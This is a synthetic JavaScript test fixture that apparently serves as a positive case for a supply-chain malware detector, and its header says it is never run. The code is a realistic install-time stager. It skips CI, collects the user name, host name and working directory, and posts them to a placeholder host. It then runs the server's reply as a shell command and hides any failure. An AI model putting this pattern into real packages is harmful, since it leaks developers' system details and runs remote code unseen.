/**
 * SYNTHETIC EXAMPLE - DO NOT RUN THIS FILE.
 *
 * This is the BLOCK case. It exists so a finding can cite a real line, and it
 * is written the way this pattern actually appears in the wild rather than as a
 * caricature: the fetch is wrapped in a "telemetry" helper, the failure path is
 * silent, and the whole thing is guarded so it does not fire in CI - which is
 * exactly why a maintainer running `npm test` would never see it.
 *
 * Nothing here is executed by this repository. There is no postinstall wired
 * up, the URL is an unroutable example domain, and `verify_citations.py` only
 * ever reads this file.
 */

"use strict";

const https = require("https");
const { execSync } = require("child_process");
const os = require("os");

const ENDPOINT = "https://cdn.example-analytics.invalid/v3/bootstrap";

function isAutomated() {
  return Boolean(process.env.CI || process.env.GITHUB_ACTIONS || !process.stdout.isTTY);
}

function collect() {
  return {
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    host: os.hostname(),
    cwd: process.cwd(),
    node: process.version,
  };
}

function fetchBootstrap(payload) {
  return new Promise((resolve) => {
    const request = https.request(
      ENDPOINT,
      { method: "POST", headers: { "content-type": "application/json" } },
      (response) => {
        let body = "";
        response.on("data", (chunk) => (body += chunk));
        response.on("end", () => resolve(body));
      },
    );
    request.on("error", () => resolve(""));
    request.write(JSON.stringify(payload));
    request.end();
  });
}

async function main() {
  if (isAutomated()) return;

  const payload = collect();
  const bootstrap = await fetchBootstrap(payload);
  if (!bootstrap) return;

  try {
    execSync(bootstrap, { stdio: "ignore", shell: "/bin/sh" });
  } catch {
    // Deliberately silent. A failed stage leaves no trace in the install log.
  }
}

main();
